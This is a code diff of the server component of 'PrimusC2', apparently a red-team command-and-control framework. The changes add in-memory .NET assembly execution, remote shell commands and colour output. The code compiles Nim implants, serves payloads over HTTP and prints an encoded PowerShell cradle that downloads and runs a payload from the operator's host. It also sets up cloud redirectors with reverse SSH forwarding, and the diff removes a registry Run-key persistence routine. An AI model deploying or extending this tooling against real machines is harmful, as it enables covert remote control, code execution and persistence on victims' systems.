@@ -16,9 +16,14 @@ import randomname
 from Cryptodome.PublicKey import RSA
 import re
 import atexit
-from rich import print
+#from rich import print
 from rich.progress import track
 import secrets
+import colorama
+from colorama import Fore, Back, Style
+import readline
+
+
 
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
@@ -27,7 +32,7 @@ def banner():
 
 
 def help():
-    print('''
+    print(Fore.CYAN + '''
     ------------------------------------------------------------------------------------------------------
     Menu Commands
     ------------------------------------------------------------------------------------------------------
@@ -48,10 +53,15 @@ def help():
     exit                        --> Terminate current session
     GetAV                       --> Get the current AV running
     pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
+    execute-ASM <file> <args>   --> Execute .NET assembly from memory   
+    ls                          --> List files in current directory
+    cd <dir>                    --> Change current working directory
+    pwd                         --> Print current working directory
+    shell                       --> Run Windows CMD commands on target
     ''')
 
 def help_implant():
-    print('''
+    print(Fore.CYAN +'''
     ------------------------------------------------------------------------------------------------------
     Implant Commands
     ------------------------------------------------------------------------------------------------------
@@ -61,6 +71,11 @@ def help_implant():
     exit                        --> Terminate current session
     GetAV                       --> Get the current AV running
     pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
+    execute-ASM <file> <args>   --> Execute .NET assembly from memory
+    ls                          --> List files in current directory
+    cd <dir>                    --> Change current working directory
+    pwd                         --> Print current working directory
+    shell                       --> Run Windows CMD commands on target
     ''')
 
 
@@ -68,11 +83,11 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     try:
         sock.bind((host_ip, int(host_port)))
     except (OSError):
-        print(f'[-] Adress already in use, please try another one')
+        print(f'{Fore.RED}[-] Adress already in use, please try another one')
     if listen_choice == "3":
-        print(f'[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
+        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
     else:
-        print(f'[*] Awaiting callback from implants on {host_ip}:{host_port}')
+        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
     
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
@@ -81,13 +96,39 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     
 
     
+def fix_base64_padding(base64_string):
+    # Calculate the number of padding characters needed
+    missing_padding = len(base64_string) % 4
+    # Add the necessary padding
+    if missing_padding:
+        base64_string += b'=' * (4 - missing_padding)
+    return base64_string
 
 def comm_in(target_id):
-    print(f'[*] Awaiting response...')
-    response = target_id.recv(4096).decode()
-    response = base64.b64decode(response)
-    response = response.decode().strip()
-    return response
+    try:
+        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting response...')
+
+        size_data = target_id.recv(1024).decode()
+        print(f'{Fore.LIGHTYELLOW_EX}[*] Size of response is: {size_data}')
+        size = int(size_data.strip())
+
+        # Receive the entire message
+        output = b""
+        while len(output) < size:
+            chunk = target_id.recv(1024)
+            if not chunk:
+                break
+            output += chunk
+        output1 = fix_base64_padding(output)
+        decoded_output = base64.urlsafe_b64decode(output1)
+        result = decoded_output.decode().strip() + '\n'
+
+        # Clear the buffer before returning
+        target_id.recv(1024)
+        return result
+    except:
+        print(f'{Fore.RED}[-] An error occurred while receiving data from the target')
+        pass
 
 def comm_out(target_id, message):
     message = str(message + '\n')
@@ -100,7 +141,7 @@ def kill_signal(target_id, message):
 
 def target_comm(target_id, targets, num):
     while True:
-        message = input(f'{targets[num][3]}/{targets[num][1]}#> ') + '\n'
+        message = input(f'{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#> ') + '\n'
         if len(message) == 0:
             continue
         if message == 'help':
@@ -111,7 +152,7 @@ def target_comm(target_id, targets, num):
             if message == 'exit\n':
                 target_id.send(message.encode())
                 target_id.close()
-                targets[num][7] = 'Dead'
+                targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
                 break
             if message == 'background\n':
                 break
@@ -119,24 +160,39 @@ def target_comm(target_id, targets, num):
             if message == 'help\n':
                 help_implant()
            
-            if message == 'persist\n':
-                payload_n = input('[*] Enter the name of the payload to add to persist: ')
-                if targets[num] [6] == 1:
-                    ran_name = randomname.get_name()
-                    persist1 = f'copy {payload_n} C:\\Users\\Public'
-                    comm_out(target_id, persist1) 
-                    persist2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /t REG_SZ /d C:\\Users\Public\\{payload_n}'
-                    comm_out(target_id, persist2)
-                    print(f'[*] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /f')
-                    print('[+] The persistance technique has completed')
              
             if message == 'GetAV':
                 pass
+
+            if message.split(" ")[0] == 'execute-ASM':
+                #sendasm(message)
+                global outfile
+                args = list(message.split(" "))
+                if len(args) > 0:
+                    CSharpToNimByteArray(args[1])
+                else:
+                    print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
+                    return                
+
+                with open(outfile, "r") as f:
+                    rub = f.read()
+                size = os.stat(outfile).st_size
+                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
+                size1 = str(size)
+                comm_out(target_id, size1)
+                print(Fore.GREEN + "[+] Sent asm size to client")
+                rub = str(rub) + "\n"
+                target_id.send(rub.encode())
+                print(Fore.GREEN + "[+] Sent asm to client")
+                os.remove(outfile)
+                response = comm_in(target_id)
+                print(response)
+                
                 
             else:
                 response = comm_in(target_id)
                 if response == 'exit':
-                    print('[-] The client has terminated the session')
+                    print(Fore.RED + '[-] The client has terminated the session')
                     target_id.close()
                     break
                 print(response)
@@ -177,10 +233,10 @@ def comm_handler():
                 
                 if host_name is not None:
                     targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
-                    print(f'[+] Callback recieved from {host_name}@{public_ip}\n' + 'Enter command#> ', end="")
+                    print(f'{Fore.GREEN}[+] Callback recieved from {host_name}@{public_ip}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
                 else: 
                     targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
-                    print(f'[+] Callback recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")
+                    print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {remote_ip[0]}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
             else:
                 remote_target.close()
         except:
@@ -202,11 +258,11 @@ def nimplant():
         shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
     else:
-        print(f'[-] implant.nim not found in {file_loc}')
-    print('[*] Use listener address or specify other IP for implant to connect to: ')
-    print('[*] 1. Listener adress')
-    print('[*] 2. Other IP')
-    imp_choice = input('[*] Enter 1 or 2: ')
+        print(f'{Fore.RED}[-] implant.nim not found in {file_loc}')
+    print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
+    print(Fore.CYAN + '[*] 1. Listener adress')
+    print(Fore.CYAN + '[*] 2. Other IP')
+    imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
     if imp_choice == "1":
         pass
     else:
@@ -226,15 +282,15 @@ def nimplant():
     with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(new_key)
         f.close()
-    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release", "--app:gui", "-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
+    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
     for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
         process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         process.wait()
     implant_loc = os.path.join(implant_loc, exe_file)
     if os.path.exists(implant_loc):
-        print(f'[+] {exe_file} saved to {implant_loc}')   
+        print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
     else:
-        print('[-] An error occurred while compiling the implant')
+        print(Fore.RED + '[-] An error occurred while compiling the implant')
     implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
     os.remove(f'{implant_loc}/{f_name}')
 
@@ -250,16 +306,17 @@ def resolve_ip(interface):
 
 def pwsh_cradle():
     try:
-        payload_name = input('[*] Input payload name for transfer: ')
-        check_file_loc = os.path.expanduser(f'~/PrimusC2/C2/Payloads/{payload_name}')
+        payload_name = input(Fore.LIGHTYELLOW_EX + '[*] Input payload name for transfer: ')
+        cwd_payload = os.getcwd()
+        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{payload_name}')
         
         if os.path.exists(check_file_loc):
             runner_file = (''.join(random.choices(string.ascii_lowercase, k=8)))
             runner_file = f'{runner_file}.exe'
             random_exe = (''.join(random.choices(string.ascii_lowercase, k=6)))
             random_exe = f'{random_exe}.exe'
-            payload_loc = os.path.expanduser('~/PrimusC2/C2/Payloads')
-            print(f'[*] Payload server available at {host_ip}:8999')
+            payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
+            print(f'{Fore.LIGHTGREEN_EX}[*] Payload server available at {host_ip}:8999')
             runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/Payloads/{runner_file}')".encode('utf-16le')
             with open(runner_file, 'w') as f:
                 f.write(f'powershell -c wget http://{host_ip}:8999/Payloads/{payload_name} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
@@ -267,13 +324,13 @@ def pwsh_cradle():
                 shutil.move(runner_file, payload_loc)
             b64_runner = base64.b64encode(runner_cal_unencoded)
             b64_runner = b64_runner.decode()
-            print(f'\n[+] B64 encoded payload\n\npowershell -e {b64_runner}')
+            print(f'{Fore.CYAN}\n[+] B64 encoded payload\n\npowershell -e {b64_runner}')
             b64_runner_decoded = base64.b64decode(b64_runner).decode()
-            print(f'\n[+] Unencoded payload\n\n{b64_runner_decoded}')
+            print(f'{Fore.CYAN}\n[+] Unencoded payload\n\n{b64_runner_decoded}')
         else:
-            print(f'[-] {check_file_loc} does not exist in payloads folder... Try another payload ')
+            print(f'{Fore.RED}[-] {check_file_loc} does not exist in payloads folder... Try another payload ')
     except(NameError):
-        print(f'[*] Payload server not running yet.. start listener: <listener -g>')
+        print(f'{Fore.RED}[*] Payload server not running yet.. start listener: <listener -g>')
 
 def web_payload_server():
     
@@ -281,7 +338,7 @@ def web_payload_server():
     http_handler.log_message = lambda *args, **kwargs: None
     server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
     
-    print(f'[+] Payload server is running at http://{host_ip}:8999')
+    print(f'{Fore.GREEN}[+] Payload server is running at http://{host_ip}:8999')
     thread = threading.Thread(target = server.serve_forever)
     thread.daemon = True
     thread.start()
@@ -290,9 +347,9 @@ def web_payload_server():
 def redirector(LPORT):
     key_loc = os.path.expanduser('~/.ssh/id_rsa')
     if os.path.exists(key_loc):
-        print('[+] Keypair already present...')
+        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
     else:
-        print('[*] Generating SSH keypair...')
+        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH keypair...')
         key = RSA.generate(2048)
         f = open("id_rsa", "wb")
         f.write(key.exportKey('PEM'))
@@ -319,7 +376,7 @@ def redirector(LPORT):
     redirector_name = "redirector.tf"
     if os.path.exists(redir_loc):
         shutil.copy(redir_loc, redir_copy_loc)
-        print('[*] Patching listening port...')
+        print(Fore.LIGHTYELLOW_EX +'[*] Patching listening port...')
         with open(f'{terra_loc}/{redirector_name}') as f:
             patch_host = f.read().replace('LPORT', str(LPORT))
         with open(f'{terra_loc}/{redirector_name}', 'w') as f:
@@ -333,9 +390,9 @@ def redirector(LPORT):
         with open(f'{terra_loc}/{script_name}', 'w') as f:
             f.write(patch_host)
             f.close()
-            print('[+] Listening port patched\n')
+            print(Fore.GREEN +'[+] Listening port patched\n')
     
-    print('[*] Provisioning and configuring redirector... This will take a couple minutes')
+    print(Fore.LIGHTYELLOW_EX +'[*] Provisioning and configuring redirector... This will take a couple minutes')
     os.chdir(terra_loc)
     os.system("terraform init")
     terra_cmd = ["terraform", "apply", "-auto-approve"]
@@ -346,35 +403,101 @@ def redirector(LPORT):
     re_ip_str = "".join(redir_ip)
     process.wait()
 
-    print('[*] Running socat relay trough SSH.. wait a moment.')
+    print(Fore.LIGHTYELLOW_EX + '[*] Running socat relay trough SSH.. wait a moment.')
     subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
         shell=False,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         check=False)
-    print('[+] Socat relay configured...')
-    print('[*] Setting up reverse port forward on localhost')
+    print(Fore.GREEN + '[+] Socat relay configured...')
+    print(Fore.LIGHTYELLOW_EX + '[*] Setting up reverse port forward on localhost')
     os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
     os.chdir(old_cwd)
 
+
+def CSharpToNimByteArray(inputfile, folder=False):
+    global outfile
+    if folder:
+        files = os.listdir(inputfile)
+        for file in files:
+            print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
+            outfile = file + "NimByteArray.txt"
+    
+            with open(file, "rb") as f:
+                hex_data = f.read().hex()
+                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
+                hex_string = "0x" + hex_string
+                with open(outfile, "w", encoding="utf-8") as out:
+                    out.write(hex_string)
+    
+        print(Fore.GREEN + "[*] Results Written to the same folder")
+    else:
+        try:
+            cwd_payload = os.getcwd()
+            inputfile_path = os.path.expanduser(f'{cwd_payload}/Payloads')
+            print(f"Converting {inputfile}")
+            outfile = inputfile + "NimByteArray.txt"
+            
+            with open(f'{inputfile_path}/{inputfile}', "rb") as f:
+                hex_data = f.read().hex()
+                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
+                hex_string = "0x" + hex_string
+                with open(outfile, "w", encoding="utf-8") as out:
+                    out.write(hex_string)
+            
+            print(f"{Fore.GREEN}[*] Result Written to {outfile}")
+        except:
+            print(f"{Fore.RED}[-] File not found")
+
+    # dos2unix conversion
+    with open(outfile, "r") as f:
+        content = f.read()
+        with open(outfile, "w") as out:
+            out.write(content.replace("\r\n", "\n"))
+
+class MyCompleter(object):  # Custom completer
+
+    def __init__(self, options):
+        self.options = sorted(options)
+
+    def complete(self, text, state):
+        if state == 0:  # on first trigger, build possible matches
+            if text:  # cache matches (entries that start with entered text)
+                self.matches = [s for s in self.options 
+                                    if s and s.startswith(text)]
+            else:  # no text entered, all matches possible
+                self.matches = self.options[:]
+
+        # return match indexed by state
+        try: 
+            return self.matches[state]
+        except IndexError:
+            return None
    
 def exit_handler():
     cwd = os.getcwd()
-    print('[*] Destroying redirector infrastructure...')
+    print(Fore.LIGHTYELLOW_EX + '[*] Destroying redirector infrastructure...')
     terra_loc = os.path.expanduser(f'{cwd.strip("C2")}/Terraform')
     os.chdir(terra_loc)
     os.system("terraform destroy -auto-approve")
 
     try:
-        print('[*] Cleaning up files...')
+        print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
         os.remove("script.sh")
         os.remove("redirector.tf")
-        print('[+] Files succesfully cleaned')
+        print(Fore.GREEN + '[+] Files succesfully cleaned')
         
     except:
-        print('[-] File not found.')
+        print(Fore.RED+'[-] File not found.')
 
 if __name__ == '__main__':
+    keywords = ["listeners -g", "nimplant", "sessions -l", "use ", "pwsh_cradle", "kill ", "sessions -i", "exit", "help", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "eth0", "lo", "wlan0", "eth1"]
+    completer = MyCompleter(keywords)
+    readline.set_completer(completer.complete)
+    readline.parse_and_bind('tab: complete')
+    for kw in keywords:
+        readline.add_history(kw)
+    colorama.init(autoreset=True)
     targets = [] #store each socket connection
     listener_count = 0
     banner()
@@ -384,49 +507,52 @@ if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     if not os.path.exists('Generated_Implants'):
-            print("[+] Creating Generated Implants Directory...")
+            print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
             os.mkdir('Generated_Implants')
     if not os.path.exists('Payloads'):
-            print("[+] Creating Payloads Directory...")
+            print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
             os.mkdir('Payloads')
     
     length_gen = secrets.SystemRandom()
     key_length = length_gen.randint(12,33)
     auth_key = (''.join(secrets.token_urlsafe(key_length)))
-    print(f'[+] Key for this session is {auth_key}')
+    print(f'{Fore.CYAN}[+] Key for this session is {auth_key}')
 
 
     while True:
         try:
-            command = input('Enter command#>')
+            command = input(Fore.LIGHTYELLOW_EX +'Enter command#>' + Fore.RESET)
             if command == 'help':
                 help()
             if command == 'listeners -g':
-                print('[*] 1. Interface')
-                print('[*] 2. IP-Address')
-                print('[*] 3. Listener with redirector\n ')
-                listen_choice = (input('[*] Choose an option: '))
+                try:
+                    print(Fore.CYAN + '[*] 1. Interface')
+                    print(Fore.CYAN + '[*] 2. IP-Address')
+                    print(Fore.CYAN + '[*] 3. Listener with redirector\n ')
+                    listen_choice = (input(Fore.LIGHTYELLOW_EX + '[*] Choose an option: ' + Fore.RESET))
+                except (OSError, ValueError, TypeError):
+                    print(Fore.RED + '[-] No such option... Please try again')
                 
                 if listen_choice == '1':
                     while True:
                         try:
-                            host_ip = resolve_ip(input('[*] Enter the interface to listen on: '))
-                            host_port = int(input('[*] Enter listening port: '))
+                            host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
+                            host_port = int(input(Fore.CYAN + '[#] Enter listening port: '+ Fore.RESET))
                             break  # exit the loop if no exception was raised
                         except (OSError, ValueError, TypeError):
-                            print('[-] No such Interface or port... Please try again')
+                            print(Fore.RED + '[-] No such Interface or port... Please try again')
                 elif listen_choice == 2:
                     
                     while True:
                         try:
-                            host_ip = input('[*] Enter the IP to listen on: ')
-                            host_port = int(input('[*] Enter listening port: '))
+                            host_ip = input('[#] Enter the IP to listen on: ')
+                            host_port = int(input('[#] Enter listening port: '))
                             break  # exit the loop if no exception was raised
                         except (OSError, ValueError, TypeError):
                             print('[-] No such IP or port... Please try again')
                 elif listen_choice == '3':
                     host_ip = resolve_ip("lo")
-                    host_port = int(input('[*] Enter listening port: '))
+                    host_port = int(input('[#] Enter listening port: '))
                     redirector(host_port)
                 
                 listener_handler()
@@ -461,7 +587,7 @@ if __name__ == '__main__':
                     session_counter = 0
                     if command.split(" ")[1] == '-l':
                         session_table = PrettyTable()
-                        session_table.field_names = ['Session','Username', 'Admin' ,'Status' ,'Target','Operating System','Check-in Time']
+                        session_table.field_names = [Fore.CYAN +'Session','Username', 'Admin' ,'Status' ,'Target','Operating System','Check-in Time']
                         session_table.padding_width = 3
                         for target in targets:
                             session_table.add_row([session_counter, target[3],target[4],target[7], target[1], target[5],target[2]])
@@ -474,14 +600,14 @@ if __name__ == '__main__':
                             if (targets[num])[7] == 'Active':
                                 target_comm(target_id, targets, num)
                             else: 
-                                print('[-] Can not interact with Dead implant')
+                                print(Fore.RED +'[-] Can not interact with Dead implant')
                         except IndexError:
                             try:
-                                print(f'[-] Session {num} does not exist')
+                                print(f'{Fore.RED}[-] Session {num} does not exist')
                             except(NameError):
-                                print('[-] Please provide a session to interact with..')
+                                print(Fore.RED + '[-] Please provide a session to interact with..')
             except(IndexError):
-                print('[*] Please providea flag.. eg <-l> or <-i>')
+                print(Fore.LIGHTYELLOW_EX +'[*] Please providea flag.. eg <-l> or <-i>')
             if command.split(" ")[0] == 'use':
                 try:
                     num = int(command.split(" ")[1])
@@ -489,12 +615,12 @@ if __name__ == '__main__':
                     if (targets[num])[7] == 'Active':
                         target_comm(target_id, targets, num)
                     else: 
-                        print('[-] Can not interact with Dead implant')
+                        print(Fore.RED +'[-] Can not interact with Dead implant')
                 except (IndexError, TypeError):
-                    print(f'[-] Session {num } does not exist' )
+                    print(f'{Fore.RED}[-] Session {num } does not exist' )
                     
             if command == 'exit':
-                quit_message = input('Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
+                quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                 if quit_message == 'y':
                     for target in targets:
                         if target[7] == 'Dead':
@@ -508,7 +634,7 @@ if __name__ == '__main__':
                 else:
                     continue
         except KeyboardInterrupt:
-            quit_message = input('Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
+            quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
             if quit_message == 'y':
                 for target in targets:
                     if target[7] == 'Dead':
